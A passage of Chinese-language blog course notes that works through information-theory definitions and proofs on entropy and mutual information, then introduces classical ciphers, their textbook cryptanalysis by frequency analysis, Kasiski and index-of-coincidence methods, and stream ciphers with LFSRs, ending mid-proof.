<li>当这些变量均独立时，$I(x_1x_2…x_n)=I(x_1)+I(x_2)+…+I(x_n)$</li>
</ul>
</li>
<li><p>条件自信息量</p>
<ul>
<li>类比条件概率</li>
<li>后验概率：$I(x_i|y_j)=-\log_2p(x_i|y_j)$</li>
<li>信道转移概率：$I(y_j|x_i)=-\log_2p(y_j|x_i)$</li>
<li>$I(x_iy_j)=-\log_2p(y_j|x_i)p(x_i)=I(x_i)+I(y_j|x_i)=I(y_j)+I(x_i|y_j)$</li>
</ul>
</li>
<li><p>互信息量</p>
<ul>
<li>$I(x_i;y_j)=I(x_i)-I(x_i|y_j)=\log_2\frac{p(x_i|y_j)}{p(x_i)}$，即先验不确定度$-$后验不确定度</li>
</ul>
</li>
</ul>
<font color=red>直观理解：</font>

<font color=blue>自信息量：信息本身发生的概率决定本信息的**可识别度**。信息发生的概率越高，可识别度越低，只需要很少的比特位就可以将其完全表示，提供给我们的信息也越少；信息发生的概率越低，可识别度越高，需要更多的比特位来表示，提供给我们的信息也越多。我们可以想象一下，如果一个事件一定发生，那这个时间对于我们没有价值，因为我们不需要任何信息就知道它一定发生；如果一个事件很难发生，比如中彩票，只要发生，就能提供具有很强识别度的信息，中彩票之后，你可以买车，买很多东西都可以，但是不中的话，也就只是不中而已，生活照常进行没有任何影响。我们可以粗略地将每一个比特位看成概率的划分，如对于2位比特位，其有00,01,10,11四种状态，可以将整个概率空间1分为4个部分，每个部分代表25%概率。假设有4个事件，概率均为25%，且任意两个事件不可能同时发生（想象成箱子中有4个球，随机拿一个球）。此时，如果我们只给出一个比特位，如0，它能确定我们拿出来的是什么球吗？显然不能，因为一个比特位只有两种状态：0和1。如果将2位比特位与摸出的球的编号一一对应，那么一位比特位就能够代表摸出某2个球，但不可能是剩下2个球。我们虽然不能通过1个比特位确定到底拿的是什么球，但至少缩小了范围，当然这还不够。如果我们能够知道两个比特位，那么我们就能够最终确定我们拿出来的是什么球。</font>

<font color=blue>**注意！每一个比特位对于概率的分配都是均分，不存在对于一个比特位中0和1表示不同的概率。**</font>

<font color=blue>我们考虑一种最为普通的情况：事件A发生的概率为90%，那么我们只需要1个比特位就能够确认事件A是否发生。如果将0代表为A发生，那么1就代表A一定不发生吗？那可未必。A发生的概率是90%，比特位为0的概率为50%，因此如果比特位为1，那么A发生的概率还有80%（条件概率），但是此时A是否发生就是不确定的了。不过我们并不需要考虑1的情况，因为0就足以确认A发生。如果我们要表示A不发生的概率，那么就至少需要4个比特位，4个比特位共有16种状态，其中至多可以有一个状态能被完全包含在A不发生的概率之中，这也就确定了A不发生。</font>

<font color=blue>联合自信息量：理解了自信息量之后，联合自信息量也就不难理解。不过是将一个随机变量变成了多个而已。</font>

<font color=blue>条件自信息量：需要分先验和后验进行理解。先验的条件自信息量以先验概率为基础计算，又称信道转移概率。举一个通俗的例子：假如在某地冬天，一天气温低于0度的概率为30%，在低于0度的情况下，附近一条河流结冰的概率为80%。如果我们抛开气温不管只看河流是否结冰，此时河流结冰的概率应为24%，通过河流结冰，我们能够获得较多信息，比如今天大概率很冷。但如果我们已经知道了今天温度低于0度，再看到河流结冰时，能够获取的信息就不多了，因为此时河流结冰几乎是自然而然发生的事情，不需要任何怀疑。相反地，后验的条件自信息量以后验概率为基础计算，与先验概率的理解类似。还是上面的例子，今天河流结冰了，那么如果今天温度高于0度，那就很值得研究了，因为这种情况理论上是不可能发生的。</font>

<font color=blue>互信息量：表现两个随机变量之间的联系。为随机变量X的先验不确定度$-$后验不确定度。如果互信息量大于0，说明Y的发生减少了X提供的信息量。如果小于0，说明Y的发生增加了X提供的信息量。因为X和Y如果有联系，那么Y的发生可能会改变X发生的概率。</font>

<h2 id="七、熵"><a href="#七、熵" class="headerlink" title="七、熵"></a>七、熵</h2><p>定义：随机变量X的信息熵定义为自信息量$I(x)$的数学期望，简称熵。</p>
<script type="math/tex; mode=display">H(X)=E[I(x)]=-\sum_{x\in X}p(x)(\log_2p(x))</script><p>理解：</p>
<ul>
<li>熵非负</li>
<li>信源发出前，表示信源的平均不确定度</li>
<li>信源发出后，表示信源提供的平均信息量</li>
<li>是一个统计量，反映了随机变量$X$的随机性</li>
</ul>
<h3 id="定理2-6"><a href="#定理2-6" class="headerlink" title="定理2.6"></a>定理2.6</h3><p>假设随机变量$X$的概率分布为$p_1,p_2,…,p_n$，则$H(X)\le \log_2n$，当且仅当$p_i=\frac{1}{n}$时等式成立</p>
<p>证明：<br>使用琴生（Jensen）不等式：在上凸函数中，有$\sum_{i=1}^na_if(x_i)\le f(\sum_{i=1}^na_ix_i),\sum_{i=1}^na_i=1,a_i&gt;0$，当且仅当$x_1=…=x_n$时等号成立<br>由上述不等式可知</p>
<script type="math/tex; mode=display">H(X)=\sum_{i=1}^np_i(\log_2\frac{1}{p_i})\le \log_2(\sum_{i=1}^n(p_i\cdot\frac{1}{p_i}))=\log_2n</script><p>当且仅当$p_i=\frac{1}{n}$时等式成立，证毕。</p>
<ul>
<li>联合熵：两个随机变量的熵。性质：<script type="math/tex; mode=display">\max[H(X_1),...,H(X_n)]\le H(X_1X_2...X_n)\le H(X_1)+...+H(X_n)</script></li>
</ul>
<h3 id="定理2-7"><a href="#定理2-7" class="headerlink" title="定理2.7"></a>定理2.7</h3><p>$H(XY)\le H(X)+H(Y)$，当且仅当$X$和$Y$统计独立时等号成立</p>
<p>证明：设$Pr[X=x_i,Y=y_j]=r_{ij},Pr[X=x_i]=p_i,Pr[Y=y_j]=q_j$<br>$H(XY)=\sum_{i=1}^m\sum_{j=1}^nr_{ij}\log_2\frac{1}{r_{ij}}$<br>$H(X)=\sum_{i=1}^mp_i\log_2\frac{1}{p_i}=\sum_{i=1}^m\sum_{j=1}^nr_{ij}\log_2\frac{1}{p_i}$<br>$H(Y)=\sum_{j=1}^nq_j\log_2\frac{1}{q_j}=\sum_{j=1}^n\sum_{i=1}^nr_{ij}\log_2\frac{1}{q_j}$<br>$H(XY)-H(X)-H(Y)=\sum_{i=1}^m\sum_{j=1}^nr_{ij}\log_2\frac{p_iq_j}{r_{ij}}\le \log_2(\sum_{i=1}^m\sum_{j=1}^np_iq_j)=0$</p>
<ul>
<li>条件熵：$H(X|Y)=-\sum_{x\in X}\sum_{y\in Y}p(xy)\log_2p(x|y)$<ul>
<li>对于Y的任意取值y得到一个X上的条件概率分布，相应的随机变量即为$X|y$，可知<script type="math/tex; mode=display">H(X|y)=-\sum_{x\in X}p(x|y)\log_2p(x|y)</script></li>
<li>上式对y加权平均即得到$H(X|Y)$的值</li>
</ul>
</li>
</ul>
<h3 id="定理2-8"><a href="#定理2-8" class="headerlink" title="定理2.8"></a>定理2.8</h3><p>$H(XY)=H(Y)+H(X|Y)$</p>
<p>证明：两边分别展开易证</p>
<h3 id="推论2-9"><a href="#推论2-9" class="headerlink" title="推论2.9"></a>推论2.9</h3><p>$H(X|Y)\le H(X)$，当且仅当$X$和$Y$统计独立时等号成立。</p>
<p>证明：</p>
<script type="math/tex; mode=display">H(X|Y)=-\sum_{x\in X}\sum_{y\in Y}p(xy)\log_2p(x|y)=\sum_{x\in X}\sum_{y\in Y}p(xy)\log_2\frac{p(y)}{p(xy)}=\sum_{x\in X}\sum_{y\in Y}p(x)p(y|x)\log_2\frac{p(y)}{p(xy)}\\
H(X)=\sum_{x\in X}p(x)\log_2\frac{1}{p(x)}</script><p>即证</p>
<script type="math/tex; mode=display">\sum_{x\in X}\sum_{y\in Y}p(y|x)\log_2\frac{p(y)}{p(xy)}\le \sum_{x\in X}\log_2\frac{1}{p(x)}</script><p>即证</p>
<script type="math/tex; mode=display">\sum_{x\in X}\sum_{y\in Y}p(y|x)\log_2\frac{p(x)p(y)}{p(xy)}\le 0</script><p>即证</p>
<script type="math/tex; mode=display">\sum_{x\in X}\sum_{y\in Y}p(y|x)\log_2\frac{p(y)}{p(y|x)}\le 0\\
\sum_{x\in X}\sum_{y\in Y}p(y|x)\log_2\frac{p(y)}{p(y|x)}\le \sum_{x\in X}\log_2(\sum_{y\in Y}p(y))=\sum_{x\in X}\log_21=0</script><p>证毕</p>
<h2 id="八、平均互信息量"><a href="#八、平均互信息量" class="headerlink" title="八、平均互信息量"></a>八、平均互信息量</h2><p>$I(X;Y)$定义为互信息量在联合概率空间上的数学期望</p>
<script type="math/tex; mode=display">I(X;Y)=E[I(x;y)]=\sum_{x\in X}\sum_{y\in Y}p(xy)I(x;y)\\
=H(X)-H(X|Y)=H(Y)-H(Y|X)=H(X)+H(Y)-H(XY)</script><script type="math/tex; mode=display">\sum_{x\in X}\sum_{y\in Y}p(xy)I(x;y)=\sum_{x\in X}\sum_{y\in Y}p(xy)\log_2\frac{p(xy)}{p(x)p(y)}\\
H(X)=\sum_{x\in X}p(x)\log_2\frac{1}{p(x)}=\sum_{x\in X}\sum_{y\in Y}p(xy)\log_2\frac{1}{p(x)}\\
H(Y)=\sum_{y\in Y}p(y)\log_2\frac{1}{p(y)}=\sum_{x\in X}\sum_{y\in Y}p(xy)\log_2\frac{1}{p(y)}\\
H(XY)=\sum_{x\in X}\sum_{y\in Y}p(xy)\log_2\frac{1}{p(xy)}</script><p>性质：</p>
<ul>
<li>非负</li>
<li>对称：$I(X;Y)=I(Y;X)\le \min\{H(X),H(Y)\}$</li>
<li>当X,Y概率独立时，$I(X;Y)=0$</li>
<li>当X,Y存在有一一对应关系时，$I(X;Y)=H(X)=H(Y)$</li>
</ul>
<font color=blue>平均条件互信息量：$I(X;Y|Z)=I(X;YZ)-I(X;Z)$</font>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-1%E2%80%94%E2%80%94%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-1%E2%80%94%E2%80%94%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6/" class="post-title-link" itemprop="url">密码学基础 Chapter 1——古典密码学</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:55:12" itemprop="dateCreated datePublished" datetime="2023-02-28T22:55:12+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:18" itemprop="dateModified" datetime="2023-03-01T11:31:18+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">密码学基础</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>9.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Chapter-1-古典密码学"><a href="#Chapter-1-古典密码学" class="headerlink" title="Chapter 1 古典密码学"></a>Chapter 1 古典密码学</h1><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><ol>
<li>密码学是提供安全服务的关键理论和技术，包含：数据机密性、数据完整性、鉴别、不可否认等。</li>
<li>密码学与隐写术的区别：隐写术通过隐藏消息的存在来保护消息，常用手段有：隐形墨水、字符格式变化、图形图像等，而密码学是将消息本身加密成为密文后发送，可以隐藏，也可以不隐藏，关键不在于隐藏，而在于解密。</li>
<li>发送者将消息通过不安全信道发送给接受者，想要确保除了接受者之外没有其他人能够阅读发送的消息。</li>
<li>明文：要传输的消息；密文：加密后的消息；加密：用某种方法伪装消息以隐藏其内容的过程；解密：将密文还原为明文的过程；秘钥：预先确定的用于加解密过程的参数。</li>
<li>加密算法：对明文加密操作采用的一组规则；解密算法：对密文解密采用的一组规则；密码算法：用于加密和解密的数学函数。</li>
<li>按明文处理方式可将密码分为分组密码和流密码。分组密码事先将明文分成若干组，对每组采用同样的加密方式加密，再将每组加密的密文相接形成密文。流密码分组后对每一组使用不同加密方式加密，然后将密文相接形成总的密文。按明文保密条件可分为受限制算法和基于秘钥算法。<br> (1) 受限制的算法：安全性基于算法的保密性（这种密码实际上并不安全）<br> (2) 基于密钥的算法：安全性基于密钥的安全性，算法本身可以公开。基于密钥的算法通常分为对称密码算法和公开密钥算法<font color=red>（Kerckhoffs假设）</font>。其中对称加密算法是指加密密钥和解密密钥相同或可以互相推导的密码算法，公开密钥算法的加密密钥和解密密钥实质不同，已知信息下无法相互推导（非对称密钥算法）。</li>
<li>加密通信模型：Alice和Bob双方通过加密机和解密机进行密文解密和明文加密，将密文通过不安全信道传输，不安全信道中有攻击者Oscar截获明文。对称密钥系统存在一个密钥源为Alice和Bob双方分配密钥，分配密钥的过程完全安全，Oscar无法窃听；非对称密钥系统中的密钥源是公开的，任何人都能够互获取，但Alice和Bob都有自己不公开的私钥用于解密。</li>
<li>密码体制数学描述：<br> 一个五元组<script type="math/tex">(P, C, K, E, D)</script>满足条件：<br> (1) P为可能明文的有限集（明文空间）<br> (2) C为可能密文的有限集（密文空间）<br> (3) K为一切可能密钥构成的有限集（密钥空间）<br> (4) E是加密算法的有限集<br> (5) D是解密算法的有限集<br> (6) 对 $\forall k \in K , \exist e_k \in E, \exist d_k \in D \Rightarrow e_k: P \rightarrow C, d_k: C \rightarrow P, d_k(e_k(x)) =  x (x \in P)$ （加密函数必须为单射函数，否则一个明文可能解密出多个密文）</li>
<li>古典密码实现技术：<br> (1) 代换：加密将明文字符按对应关系代换为对应的密文字符，解密则反过来操作。密钥为明密文字符之间的对照关系。包含：单表代换、多表代换（维吉尼亚密码）、多字符代换等。<br> (2) 置换：将明文字符按照一定规则移动位置得到密文，字符本身不变。解密则反过来进行。密钥为移位规则。</li>
</ol>
<h2 id="二、几种古典密码"><a href="#二、几种古典密码" class="headerlink" title="二、几种古典密码"></a>二、几种古典密码</h2><ol>
<li><strong>移位密码</strong><br> 将字母表中每个字母向后移动若干位作为密文字符。可通过密文字符频率分析破解或暴力破解（唯密文攻击）$a b$<br> 数学描述：<br> $P = C = K = Z_{26}$<br> 对$k, x, y \in Z_{26}$，定义有<br> $e_k(x) = (x+k) \mod 26$<br> $d_k(y) = (y-k) \mod 26$<br> k=3时称为凯撒密码</li>
<li><strong>代换密码</strong><br> 建立一个明文字符与密文字符的一一对应关系，将明文对应字符替换为密文字符。也可以通过密文字符频率破解（唯密文攻击）<br> 数学描述：<br> $P = C = Z_{26}$<br> K是由26个数字0, 1, … 25所有可能的置换组成<br> 对任意置换$\pi \in K$，定义有<br> $e_\pi(x) = \pi(x), d_\pi(y) = \pi^{-1}(y)$</li>
<li><strong>仿射密码</strong><br> 其机制与移位密码类似，将明文字符通过模线性变换ax+b成为密文字符。可通过密文字符频率破解（唯密文攻击）<br> 数学描述：<br> $P = C = Z_{26}$<br> $K=\{(a,b)\in Z_{26}\times Z_{26}: \gcd(a,26)=1\}$<br> 对$\forall k=(a,b)\in K， x,y\in Z_{26}$，定义<br> $e_k(x)=(ax+b)\mod 26, d_k(y)=a^{-1}(y-b)\mod 26$<br> 其中$\gcd(a,26)=1$是为了满足单射的条件。<br> 当a=1时即为移位密码</li>
<li><strong>维吉尼亚密码</strong><br> 维吉尼亚密码选择一个字符串作为密钥，并将明文按照字符串长度分为长度相等的若干组，对于每一组中的明文字符，按照对应位置密文的字母确定移位数量。破解方式较上述三种复杂，但仍能进行唯密文攻击。<br> 数学表述：<br> $P = C = K = (Z_{26})^m$，m为正整数<br> 对$\forall k=(k_1, k_2, …, k_m)\in K, x = (x_1, x_2, …, x_m)\in P, y=(y_1, y_2, …, y_m)$，定义有<br> $e_k(x)=(x_1+k_1, x_2+k_2, …,x_m+k_m)$<br> $d_k(y)=(y_1-k_1,y_2-k_2,…y_m-k_m)$<br> (以上运算均在模26下进行)</li>
<li><strong>希尔密码</strong><br> 希尔密码的加密方式可以说是仿射密码、移位密码、代换密码的超集。将明文字符串分为长度相等的若干组，对每一组进行相同的矩阵乘法（也就是一种较仿射密码更加复杂的线性变换），获取结果即为密文。<br> 数学描述：<br> $P = C = (Z_{26})^m$，m为不小于2的正整数<br> K是定义在$Z_{26}$上的$m\times m$可逆矩阵的集合<br> 取密钥$k \in K$，k为一个$m\times m$矩阵，记为$(k_{ij})$，对于$x=(x_1, x_2, …, x_m)\in P, y=(y_1, y_2, …, y_m)\in C$，定义有<br> $e_k(x)=xk, d_k(y)=yk^{-1}$<br> (以上运算均在模26下进行)</li>
<li><strong>置换密码</strong><br> 将明文打乱顺序变为密文。<br> 数学描述：<br> $P = C = (Z_{26})^m$，m为正整数<br> K是由所有定义在集合{1, 2, …, m}上的置换组成<br> 对于任意密钥$\pi$，定义<br> $e_\pi(x_1,x_2,…x_m)=(x_{\pi(1)},x_{\pi(2)},…,x_{\pi(m)})$<br> $d_\pi(y_1,y_2,..,y_m)=(y_{\pi^{-1}(1)},x_{\pi^{-1}(2)},…,x_{\pi^{-1}(m)})$<br> 置换密码实际上是希尔密码的特殊形式，其置换矩阵与排列有关。置换矩阵的行数和列数等于一组字符数量，如果这一组中明文第i个位置被换成了第j个位置的元素，则第i列的第j个数为1。</li>
</ol>
<h2 id="三-古典密码分析"><a href="#三-古典密码分析" class="headerlink" title="三. 古典密码分析"></a>三. 古典密码分析</h2><ul>
<li><strong>概念</strong><br>  密码分析：分析者在已知密码体制（密码算法及实现的全部详细资料）的前提下破译使用的密钥。<br>  常用密码分析攻击有4类：<br>  唯密文攻击（COA）：攻击者仅掌握密文的攻击<br>  已知明文攻击（KPA）：攻击者知道不由他控制的明文以及对应的密文<br>  选择明文攻击（CPA）：攻击者可以在一定程度上选择明文获取密文<br>  选择密文攻击（CCA）：攻击者可以在一定程度上选择密文获取明文<br>  这4种攻击方式依次增强，如果一种加密算法能够抵抗后面的攻击，那么也一定能够抵抗前面的攻击。</li>
<li><strong>古典密码攻击要点</strong><br>  只有当密文长度足够长时，才能够分析大多数古典密码。<br>  只能分析由有具体语义明文加密而来的密文，否则即使解密完成也不知道解密出来的是不是密文。<br>  通常需要使用英文字母频率分析与反复猜测。</li>
<li><strong>英文字母频率规律</strong><br>  第1档：E出现次数远多于其他字母<br>  第2档：TAOINSHR<br>  第3档：CUMWFGYPB<br>  第4档：VKJXQZ<br>  常见双字母固定序列：TH HE IN ER AN RE ED ON ES ST EN AT TO NT HA ND OU EA NG AS OR TI IS ET IT AR TE SE HI OF<br>  常见三字母固定序列：THE ING AND HER ERE ENT THA NTH WAS ETH FOR DTH<br>  根据经验，有些字母不可能组合出现与同一个单词之中，如j和所有辅音字母相邻的概率都极低。<br>  根据密文字母出现频率高低进行猜测和验证，得到密文越长，越符合统计规律</li>
</ul>
<h3 id="1-仿射密码分析"><a href="#1-仿射密码分析" class="headerlink" title="1. 仿射密码分析"></a>1. 仿射密码分析</h3><p>分析仿射密码需要得到a与b的值，通过密文中字母的出现频率猜测出现频率最高的是什么字母，只需猜测两个字母便可以列方程组求解。注意解a须与26互素，否则猜测错误。</p>
<h3 id="2-代换密码分析"><a href="#2-代换密码分析" class="headerlink" title="2. 代换密码分析"></a>2. 代换密码分析</h3><p>分析代换密码采用与仿射密码类似的方法，使用字频分析，逐一猜测，根据经验，最早被破译的通常是’the’，要查找文本看看有没有多次存在的3字符序列。</p>
<h3 id="3-维吉尼亚密码分析"><a href="#3-维吉尼亚密码分析" class="headerlink" title="3. 维吉尼亚密码分析"></a>3. 维吉尼亚密码分析</h3><p>维吉尼亚密码分析较为复杂。由于其是多表代换，因此需要首先确认每一组字符的长度，这里应该使用Kasiski测试法：在密文中找到相同的3字符或以上序列，找出它们所在的起始位置，对这些位置的差求公因数，这些公因数之一就很可能是密钥的长度。</p>
<p>确认密钥字长度m也可以使用重合指数法。</p>
<ul>
<li>重合指数法<ul>
<li>在一个字符串X中随机取出两个字母，这两个字母恰好相同的概率记为$I_c(X)$</li>
<li>对于完全随机字符串，$I_c(X)$=1/26，约为0.038</li>
<li>对于英文文本，$I_c(X)=\sum_{i=0}^{25}p_i^2\approx 0.065$</li>
<li>在单表代换密码中，密文的重合指数应该与明文相同。<br>将密文按照密钥字长度分为m段，每一段的重合指数应该接近于0.065，通过尝试不同的m可以获取重合指数最为接近0.065的那一个m就是密钥字长度。</li>
<li>对于一段确定的英文文本，计算重合指数的公式为：$I_c(X)=\frac{\sum_{i=0}^{25}f_i(f_i-1)}{n(n-1)}$，其中$f_i$为每个密文字母的出现次数（频数）</li>
<li>确认密钥的长度之后，对于分出来的每一段密文，其中每一个密文字符相对于明文字符的偏移都是相同的。这里仍然可以使用重合指数法计算偏移量。计算方法：密文转换成明文之后，其明文的重合指数应该近似于0.065，因此对于每一个偏移量，均计算一次其与明文的重合指数，最接近于0.065的即为正确偏移量。计算公式：$M_g=\sum_{i=0}^{25}p_i\times \frac{f_{i+g}}{n’}$，其中$p_i$为每个字母在英文中出现的概率，$f_i$是每个字母在密文中出现的次数，$n’$是这一段密文的长度。</li>
</ul>
</li>
</ul>
<h3 id="4-希尔密码分析"><a href="#4-希尔密码分析" class="headerlink" title="4. 希尔密码分析"></a>4. 希尔密码分析</h3><p>破译希尔密码的关键是找到转换矩阵，其难以通过唯密文攻击破解，但可以很容易通过已知明文攻击破译。知道明文和密文之后，就可以直接计算出矩阵的值：$Y=XK\rightarrow K=X^{-1}Y$，前提是需要知道密钥矩阵的阶数。</p>
<h2 id="四-流密码"><a href="#四-流密码" class="headerlink" title="四. 流密码"></a>四. 流密码</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h3><p>之前的古典密码中对于连续明文元素使用相同密钥K加密，与分组密码的区别是：需要设计复杂的加密函数提高安全性，而且经常需要对明文进行填充以确保分组长度完整。</p>
<p>流密码将明文看做字符串或者比特串，逐字符或逐位进行加密。为防止密钥穷举，使用与明文长度相等的密钥（无限）流进行加密。关键在于如何生成密钥流。</p>
<h3 id="2-Vernam-密码"><a href="#2-Vernam-密码" class="headerlink" title="2. Vernam 密码"></a>2. Vernam 密码</h3><p>密钥与明文一样长且没有统计规律的加密。</p>
<p>加密：$C_i=P_i+K_i\mod 26, C_i=P_i\oplus K_i$<br>解密：$P_i=C_i-K_i\mod 26, P_i=C_i\oplus K_i$</p>
<p>需要构造与明文一样长的随机密钥。（这样的密钥不能重复，否则无法对抗已知明文攻击）</p>
<h3 id="3-流密码特点"><a href="#3-流密码特点" class="headerlink" title="3. 流密码特点"></a>3. 流密码特点</h3><p>运算简单，实时性强，安全性依赖于密钥流产生方法</p>
<h3 id="4-流密码分类"><a href="#4-流密码分类" class="headerlink" title="4. 流密码分类"></a>4. 流密码分类</h3><p>按照密钥周期性分类分为周期流密码和非周期流密码<br>周期流密码：存在某一个固定正整数r使得密钥流每隔r个字符以后重复<br>非周期流密码：对于任何正整数密钥都不重复，如一次一密乱码本</p>
<p>按照密钥产生方式分为同步流密码和异步流密码<br>同步流密码：密钥流的产生独立于消息流，如分组密码中的OFB（输出反馈）模式<br>异步流密码：每一个密钥字符都是由前面n个明文或密文字符推导出来的，其中n为定值。如分组密码中的CFB（密码反馈）模式</p>
<h3 id="5-同步流密码"><a href="#5-同步流密码" class="headerlink" title="5. 同步流密码"></a>5. 同步流密码</h3><p>使用某种算法，由一个初始密钥变换出于明文串相互独立的密钥流。数学定义如下：</p>
<p>同步流密码是一个六元组$(P,C,K,L,E,D)$和一个函数$g$，且满足以下条件：</p>
<ol>
<li>$P,C,K$分别为明文、密文、密钥的有限集</li>
<li>$L$是密钥流字母表有限集</li>
<li>$g$是密钥流生成器，g使用密钥$k\in K$作为输入，产生无限长的密钥流$Z=z_1z_2…$，其中$z_1\in L$</li>
<li>对于任意$z\in L$，都有一个加密规则（函数）$e_z:P\rightarrow C\in E$和相应的解密规则（函数）$d_z:C\rightarrow P\in D$，并且对于每个明文$x\in P$满足$d_z(e_z(x))=x$</li>
</ol>
<h3 id="6-流密码与分组密码的关系"><a href="#6-流密码与分组密码的关系" class="headerlink" title="6. 流密码与分组密码的关系"></a>6. 流密码与分组密码的关系</h3><p>分组密码可以用于生成密钥序列<br>维吉尼亚密码可以看做流密码的一种特殊情况（一种短周期同步流密码，密钥流是周期为m的密钥序列）</p>
<h3 id="7-密钥流生成"><a href="#7-密钥流生成" class="headerlink" title="7. 密钥流生成"></a>7. 密钥流生成</h3><p>多使用线性递推关系产生伪随机序列（与多种高级语言的随机函数类似），这一类随机函数需要一个种子，被称为初始向量，线性递推算法可以使用硬件实现，此硬件称为线性反馈移位寄存器（LFSR）</p>
<h3 id="8-异步流密码"><a href="#8-异步流密码" class="headerlink" title="8. 异步流密码"></a>8. 异步流密码</h3><p>同步流密码存在有周期问题，异步流密码的密钥流由于与明文元素或密文元素有关，因此不存在周期问题。</p>
<h3 id="9-自动密钥密码体制：异步流密码示例"><a href="#9-自动密钥密码体制：异步流密码示例" class="headerlink" title="9. 自动密钥密码体制：异步流密码示例"></a>9. 自动密钥密码体制：异步流密码示例</h3><p>一个六元组$(P,C,K,L,E,D)$，满足：</p>
<ol>
<li>$P=C=K=L=Z_{26}$</li>
<li>密钥流定义：$z_1=k\in K, z_i=x_{i-1}, i\ge 2$</li>
<li>对于$\forall z\in K, x,y\in Z_{26}$，定义<script type="math/tex; mode=display">e_z(x)=(x+z)\mod 26, d_z(y)=(y-z)\mod 26</script></li>
</ol>
<h3 id="10-线性移位反馈寄存器-LFSR"><a href="#10-线性移位反馈寄存器-LFSR" class="headerlink" title="10.线性移位反馈寄存器(LFSR)"></a>10.线性移位反馈寄存器(LFSR)</h3><p>对于流密码，需要通过随机序列进行加密，但真正随机的序列难以应用，一般使用一个种子生成出一个伪随机的流密钥。<br>这种方式可以通过硬件方式实现，即LFSR，第n+1位由前面n位中某些位的异或得到。</p>
<script type="math/tex; mode=display">a_{n+1}=c_na_1\oplus c_{n-1}a_2\oplus ...\oplus c_1a_n</script><p>上式中的c~i~是固定值。</p>
<p><strong>定义1</strong> 周期序列：存在正整数t，满足对于任意的$k\ge 0,a_{k+t}=a_k$，其中最小的正整数t称为序列的周期，序列称为周期序列。<br><strong>定义2</strong> 特征多项式：设q元n级线性反馈移位寄存器的递推公式为：</p>
<script type="math/tex; mode=display">a_{n}=c_na_0\oplus c_{n-1}a_1\oplus ...\oplus c_1a_{n-1},c_i\in F_q,c_n=1</script><p>其变换矩阵T定义为</p>
<script type="math/tex; mode=display">T=\begin{pmatrix}0 & 0 & 0 & ... & c_n\\
1&0&0&...&c_{n-1}\\
0&1&0&...&c_{n-2}\\
...&...&...&...&...\\
0&0&...&1&c_1\end{pmatrix}</script><p>$(a_0,a_1,…,a_{n-1})T=(a_1,a_2,…,a_n)$<br>矩阵T的特征多项式$f(x)=|xI-T|=x^n-c_1x^{n-1}-…-c_{n-1}x-c_n$称为n级线性反馈移位寄存器L的特征多项式<br><strong>定义3</strong> 设T为F~q~上n级LFSR的变换矩阵，I是n×n单位矩阵，使得T^k^=I成立的最小的正整数k称为变换矩阵T的周期，记为$\rho(T)$。<br><strong>定义4</strong> 可满足多项式：设$f(x)\in F_q[x],f(0)\ne 0$，如果$f(T)=0$，则称f(x)为T可满足的多项式。所有T可满足的多项式中，次数最低的首1多项式称为T的极小多项式（与信数的极小多项式定义不太相同，这里的多项式不一定不可约），满足$f(x)|x^k-1$的最小正整数称为$f(x)$的周期，记为$\rho(f)$<br><strong><font color=blue>引理1</font></strong> 设$f(x)\in F_q[x]$是首1不可约多项式，$f(0)\ne 0$，则$\rho(f)$等于有限域$F_q[x]_{f(x)}$中元素x的阶。<br><strong><font color=blue>引理2</font></strong> 设$f(x)\in F_q[x]$是首1多项式，$f(0)\ne 0,f(x)=g(x)^b$，其中$g(x)$为$F_q[x]$中的不可约多项式，$char(F_q)=p$，t是使得$p^t\ge b$的最小正整数，则有$\rho(f)=\rho(g)p^t$<br>证明：<br>$g(x)|x^{\rho(g)}-1$（拉格朗日定理）$\Rightarrow g(x)^{p^t}|(x^{\rho(g)}-1)^{p^t}$<br>$char(F_q)=p,p^t\ge b,g(x)^{p^t}|(x^{\rho(g)}-1)^{p^t}\Rightarrow 